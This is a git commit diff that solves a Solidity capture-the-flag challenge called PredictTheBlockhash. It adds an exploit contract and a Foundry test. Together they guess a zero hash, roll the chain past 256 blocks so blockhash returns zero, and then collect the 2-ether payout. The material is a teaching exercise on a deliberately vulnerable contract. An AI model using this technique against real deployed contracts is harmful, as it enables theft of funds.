9aa2e71dd4c63917bc0a0eec3a99eb3217d5186e
Chua, Shu Ern <shuernchua@kapps.com.sg>
2023-11-26 15:09:28 +0800

    PredictTheBlockhash

--- PredictTheBlockhash/src/PredictTheBlockhash.sol
+++ PredictTheBlockhash/src/PredictTheBlockhash.sol
@@ -1,17 +1,15 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-//Challenge
+import "forge-std/console2.sol";
+
 contract PredictTheBlockhash {
     address guesser;
     bytes32 guess;
     uint256 settlementBlockNumber;
 
     constructor() payable {
-        require(
-            msg.value == 1 ether,
-            "Requires 1 ether to create this contract"
-        );
+        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
     }
 
     function isComplete() public view returns (bool) {
@@ -19,6 +17,7 @@ contract PredictTheBlockhash {
     }
 
     function lockInGuess(bytes32 hash) public payable {
+        console2.log("lockInGuess conc");
         require(guesser == address(0), "Requires guesser to be zero address");
         require(msg.value == 1 ether, "Requires msg.value to be 1 ether");
 
@@ -28,17 +27,15 @@ contract PredictTheBlockhash {
     }
 
     function settle() public {
+        console2.log("settle entered");
         require(msg.sender == guesser, "Requires msg.sender to be guesser");
-        require(
-            block.number > settlementBlockNumber,
-            "Requires block.number to be more than settlementBlockNumber"
-        );
-
+        // need to wait 2 more blocks
+        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");
         bytes32 answer = blockhash(settlementBlockNumber);
 
         guesser = address(0);
         if (guess == answer) {
-            (bool ok, ) = msg.sender.call{value: 2 ether}("");
+            (bool ok,) = msg.sender.call{value: 2 ether}("");
             require(ok, "Transfer to msg.sender failed");
         }
     }
@@ -52,5 +49,14 @@ contract ExploitContract {
         predictTheBlockhash = _predictTheBlockhash;
     }
 
-    // write your exploit code below
+    function lockInGuess() public payable {
+        bytes32 zero = bytes32(0);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(zero);
+    }
+
+    function attack() public {
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
 }
--- PredictTheBlockhash/test/PredictTheBlockhash.t.sol
+++ PredictTheBlockhash/test/PredictTheBlockhash.t.sol
@@ -14,18 +14,27 @@ contract PredictTheBlockhashTest is Test {
         // Deploy contracts
         predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
         exploitContract = new ExploitContract(predictTheBlockhash);
+        console.log("blockNumber in Setup:", block.number); //1
     }
 
     function testExploit() public {
         // Set block number
+        console.log("block.number:", block.number);
         uint256 blockNumber = block.number;
+        console.log("blockNumber:", blockNumber);
         // To roll forward, add the number of blocks to -256,
         // Eg. roll forward 10 blocks: -256 + 10 = -246
-        vm.roll(blockNumber - 256);
-
+        // vm.roll(blockNumber - 256);
+        // console.log("blockNumber after roll", block.number);
         // Put your solution here
-
+        exploitContract.lockInGuess{value: 1 ether}();
+        bytes32 _settlementBlockNumber = vm.load(address(predictTheBlockhash), bytes32(uint256(2)));
+        console.log("_settlementBlockNumber:", uint256(_settlementBlockNumber));
+        vm.roll(block.number + 256 + uint256(_settlementBlockNumber));
+        console.log("blockNumber Now:", block.number);
+        exploitContract.attack();
         _checkSolved();
+        assertEq(address(exploitContract).balance, 2 ether);
     }
 
     function _checkSolved() internal {
